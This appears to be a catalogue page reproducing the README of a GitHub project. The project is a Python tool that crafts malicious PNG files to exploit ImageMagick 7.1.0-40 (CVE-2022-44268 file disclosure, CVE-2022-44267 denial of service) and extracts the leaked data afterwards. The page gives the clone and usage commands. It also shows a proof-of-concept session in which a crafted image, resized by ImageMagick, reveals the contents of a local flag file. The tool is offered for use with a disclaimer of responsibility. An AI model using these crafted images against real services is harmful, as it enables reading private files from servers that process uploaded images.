# cve-2022-44268

Payload generator and extractor for CVE-2022-44268 written in Python.

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/agathanon](https://github.com/agathanon) |
| Url      | [https://github.com/agathanon/cve-2022-44268](https://github.com/agathanon/cve-2022-44268)                                               |
| Stars    | 3                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

# CVE-2022-44268

**Credit to the researchers who discovered this:**
- [Bryan Gonzalez and the Ocelot Team](https://www.metabaseq.com/imagemagick-zero-days/)

Create a malicious PNG to take advantage of ImageMagick 7.1.0-40:
- CVE-2022-44267: Denial of Service
- CVE-2022-44268: Information Disclosure

*Disclaimer: The author of this project is not responsible for any possible harm caused by the materials of this project.*

## Requirements
- Python3
- PIL (`pip install Pillow`)

## Usage
Crafting a PNG with **craft.py**:
```shell
git clone https://github.com/agathanon/cve-2022-44268
cd cve-2022-44268
python3 craft.py original.png lol.png /path/to/file
```

Data extraction with **extract.py**:
```shell
python3 extract.py exfil.png
```

## PoC
```shell
anon@computer:~/code/cve-2022-44268$ python3 craft.py original.png readflag.png $PWD/flag.txt 
anon@computer:~/code/cve-2022-44268$ convert readflag.png -resize 100x100 exfil.png
anon@computer:~/code/cve-2022-44268$ python3 extract.py exfil.png
AAAABBBBCCCC

anon@computer:~/code/cve-2022-44268$ 
```



## Get the content

```
git clone https://github.com/agathanon/cve-2022-44268
cd cve-2022-44268
```

{% embed url="https://github.com/agathanon/cve-2022-44268" %}

<figure><img src="https://avatars.githubusercontent.com/u/88989307?v=4" alt=""><figcaption><p>agathanon</p></figcaption></figure>
